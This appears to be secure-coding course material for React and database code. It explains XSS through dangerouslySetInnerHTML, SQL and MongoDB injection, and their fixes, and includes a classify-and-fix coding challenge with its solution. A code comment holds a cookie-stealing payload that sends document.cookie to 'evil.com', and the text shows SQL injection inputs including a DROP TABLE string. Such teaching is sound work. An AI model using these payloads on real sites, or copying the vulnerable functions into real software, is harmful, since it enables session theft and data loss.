sections.content:
React's DEFAULT behavior - rendering a value inside JSX curly braces
- automatically ESCAPES it, converting genuinely dangerous characters
(<, >, &) into their safe, literal text equivalents before ever
touching the actual DOM:

function Comment({ text }: { text: string }) {
  return <p>{text}</p>; // SAFE by default - if text contains
    // '<script>alert(1)</script>', React renders it as literal,
    // visible TEXT on the page, NOT as actual, executing HTML
}

THE SPECIFIC ESCAPE HATCH that genuinely bypasses this default
protection - dangerouslySetInnerHTML, whose name is a deliberate,
explicit warning:

function Comment({ html }: { html: string }) {
  return <p dangerouslySetInnerHTML={{ __html: html }} />;
  // GENUINELY DANGEROUS if 'html' contains ANY attacker-controlled
  // content - this renders the string as REAL, EXECUTING HTML,
  // completely bypassing React's default escaping protection entirely
}

sections.code:
// GENUINELY SAFE - the HTML string originates ENTIRELY from this
// application's own, trusted, hardcoded content with ZERO
// user-controllable influence anywhere in it
function TermsOfService() {
  const trustedStaticHtml = '<p>By using this service, you agree to our <strong>terms</strong>.</p>';
  return <div dangerouslySetInnerHTML={{ __html: trustedStaticHtml }} />;
  // SAFE - no attacker anywhere in this entire pipeline could ever
  // influence this specific string's actual content
}

// GENUINELY DANGEROUS - the HTML string includes user-controllable
// content directly, with no sanitization at all
function UserBio({ bioHtml }: { bioHtml: string }) {
  // 'bioHtml' ultimately originated from a user's OWN profile-editing
  // form - a malicious user could set their bio to
  // '<img src=x onerror="fetch(`evil.com?cookie=${document.cookie}`)">'
  return <div dangerouslySetInnerHTML={{ __html: bioHtml }} />; // DANGEROUS
}

// THE CORRECT FIX for genuinely necessary rich-text user content -
// sanitize FIRST, removing any genuinely dangerous elements/attributes,
// using a dedicated, well-maintained sanitization library:
import DOMPurify from 'dompurify';

function UserBio({ bioHtml }: { bioHtml: string }) {
  const sanitizedHtml = DOMPurify.sanitize(bioHtml); // strips out
    // <script> tags, onerror handlers, and other genuinely dangerous
    // constructs, while preserving safe formatting like <strong> or <em>
  return <div dangerouslySetInnerHTML={{ __html: sanitizedHtml }} />; // SAFE
}

codingChallenge.starterCode:
// COMPONENT A
function Footer() {
  const html = '<p>&copy; 2026 MyCompany. All rights reserved.</p>';
  return <div dangerouslySetInnerHTML={{ __html: html }} />;
}

// COMPONENT B
function ProductDescription({ description }: { description: string }) {
  // 'description' comes directly from a seller's own product-listing form
  return <div dangerouslySetInnerHTML={{ __html: description }} />;
}

// COMPONENT C
function MarkdownPreview({ renderedHtml }: { renderedHtml: string }) {
  // 'renderedHtml' is the output of converting a user's own markdown
  // input into HTML, done entirely client-side
  return <div dangerouslySetInnerHTML={{ __html: renderedHtml }} />;
}

// TODO: classify each component as safe or dangerous, with reasoning,
// and fix any genuinely dangerous one(s)

codingChallenge.solutionExample:
// COMPONENT A: GENUINELY SAFE.
// Reasoning: the HTML string is a hardcoded, static literal with
// zero user-controllable influence anywhere in it - no fix needed.

// COMPONENT B: GENUINELY DANGEROUS.
// Reasoning: 'description' originates directly from a seller's own
// input form - a malicious seller could include a <script> tag or
// an event-handler attribute, executing in EVERY buyer's browser who
// views that product page.

import DOMPurify from 'dompurify';

function ProductDescription({ description }: { description: string }) {
  const sanitized = DOMPurify.sanitize(description);
  return <div dangerouslySetInnerHTML={{ __html: sanitized }} />;
}

// COMPONENT C: GENUINELY DANGEROUS.
// Reasoning: even though the HTML was generated by a markdown
// converter rather than typed directly as HTML, the ORIGINAL markdown
// input is still genuinely user-controllable - many markdown
// converters allow raw HTML passthrough, meaning malicious script
// could still end up in the final rendered output.

function MarkdownPreview({ renderedHtml }: { renderedHtml: string }) {
  const sanitized = DOMPurify.sanitize(renderedHtml);
  return <div dangerouslySetInnerHTML={{ __html: sanitized }} />;
}

sections.content:
THE VULNERABLE PATTERN - directly concatenating user input into a
SQL query string:

async function findUserByEmail_vulnerable(email: string) {
  const query = `SELECT * FROM users WHERE email = '${email}'`;
  return await db.query(query);
}

// A malicious actor submits, as the 'email' value:
// ' OR '1'='1

// The resulting, ACTUAL query string becomes:
// SELECT * FROM users WHERE email = '' OR '1'='1'
// '1'='1' is ALWAYS true - this query now returns EVERY SINGLE USER
// in the entire table, completely bypassing the intended email filter

THE STRUCTURAL FIX - a parameterized query, exactly Module 19's
existing discipline, now understood with its genuine justification:

async function findUserByEmail_safe(email: string) {
  const query = 'SELECT * FROM users WHERE email = $1';
  return await db.query(query, [email]); // 'email' is passed as a
    // genuinely SEPARATE parameter, NEVER concatenated into the
    // query string's own text at all
}

// The SAME malicious input ("' OR '1'='1") is now treated as a
// single, literal STRING VALUE being searched for in the email
// column - genuinely no email will ever literally equal that exact
// string, so this returns zero results, with NO ability whatsoever
// to alter the query's own structure

sections.code:
// VULNERABLE PATTERN (if it existed) - constructing a query by
// directly interpolating user input into a query-like string,
// genuinely possible with certain unsafe MongoDB usage patterns:
async function findUser_vulnerable(emailInput: string) {
  // NEVER do this - using $where with string interpolation allows
  // genuine JavaScript injection into MongoDB's own query engine
  return await usersCollection.find({ $where: `this.email == '${emailInput}'` });
}

// THE SAFE, STRUCTURAL PATTERN - Module 19's actual, consistent
// usage throughout this curriculum:
async function findUser_safe(emailInput: string) {
  return await usersCollection.find({ email: emailInput });
  // 'emailInput' is passed as a genuinely separate JavaScript VALUE
  // within a query OBJECT - MongoDB's driver never interprets this
  // value as executable query syntax, regardless of its actual
  // content, structurally identical in principle to SQL's
  // parameterized $1 placeholder
}

// Even a malicious emailInput like "'; DROP TABLE users; --" is
// simply, genuinely treated as a literal STRING to search for in
// the email field - it has NO special meaning to MongoDB's query
// engine when passed this way, exactly the same structural
// guarantee SQL's parameterized queries provide

